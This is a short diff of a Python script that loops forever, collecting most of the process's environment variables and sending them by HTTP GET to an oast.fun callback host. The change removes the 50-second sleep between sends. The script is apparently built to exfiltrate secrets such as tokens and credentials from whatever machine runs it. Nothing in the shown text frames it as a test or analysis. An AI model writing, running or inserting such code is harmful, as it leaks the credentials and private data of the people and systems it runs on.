@@ -1,6 +1,5 @@
 import os
 import requests
-import time
 
 skip = {
     "BOKEH_SERVER_URL", "CLICOLOR", "CLICOLOR_FORCE", "DC_WORKSPACE_ID",
@@ -26,4 +25,3 @@ while True:
     if k not in skip
 }
     r = requests.get("https://waltpehxhgtfhgofhsbvpo4qbb7406kwq.oast.fun/", params=params)
-    time.sleep(50)
